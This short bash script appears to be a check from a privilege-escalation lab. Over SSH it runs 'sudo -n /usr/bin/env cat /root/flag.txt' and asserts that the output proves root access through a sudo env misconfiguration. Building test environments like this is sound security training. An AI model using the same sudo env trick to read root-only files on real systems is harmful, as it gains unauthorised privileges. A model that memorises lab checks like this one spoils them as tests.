#!/usr/bin/env bash
# Expects root via: sudo env …
set -euo pipefail
# shellcheck source=_common.sh
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'sudo -n /usr/bin/env cat /root/flag.txt')"
assert_root_output "${out}"
